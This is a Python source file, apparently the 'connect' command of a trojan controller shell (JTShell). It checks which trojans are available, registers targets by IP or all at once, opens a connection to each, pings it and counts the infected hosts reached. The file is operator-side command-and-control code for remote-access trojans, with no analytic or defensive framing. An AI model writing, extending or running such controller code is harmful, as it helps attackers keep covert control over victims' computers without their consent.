__author__ = 'Jonas'
from util import isip
from util import shellprint
from trojanshell import TrojanShell
from JTShell.util.message import Message
from JTShell.util.error import ProcessError
from trojanconnection import TrojanConnection
from cmds.disconnect import run as disconnect
import time


# ! implement list support
def run(process, std="127.0.0.1", list=None, info=True):
    """
    pass
    :param process:
    :param std:
    :return:
    """
    shell = process.shell
    connected_trojans = 0
    # updating the list of available trojans
    process.shell.trojanlist.check_availability()

    if isinstance(shell, TrojanShell):
        if len(shell.trojanregister) == 0:
            if std == "all":
                for trojanconnection in shell.trojanlist.available:
                    shell.trojanregister.add(trojanconnection)

            elif isip(std):
                available = False
                for trojanconnection in shell.trojanlist.available:
                    if trojanconnection.ip == std:
                        shell.trojanregister.add(trojanconnection)
                        process.shell.prompt = "\n {0}> ".format(trojanconnection.ip)
                        available = True
                if available is False:
                    shell.trojanregister.add(TrojanConnection(std, shell.port))

    for trojanconnection in process.shell.trojanregister:
        try:
            trojanconnection.start()
            time.sleep(0.5)
            if trojanconnection.ping() is True:
                shellprint(process, Message("process", "Connected to the Trojan with the ip '{0}'".format(trojanconnection.ip)))
                trojanconnection.deactivate()
                connected_trojans += 1
            else:
                shellprint(process, Message("error", "Couldn't connect to the trojan with the ip '{0}'".format(trojanconnection.ip)))
        except Exception:
            shellprint(process, Message("error", "Couldn't connect to the trojan with the ip '{0}'".format(trojanconnection.ip)))
    # returning the message, that the command has terminated and the amount of connected trojans
    return "Finished connecting to the requested trojans and finally connected {0} trojan(s)".format(connected_trojans)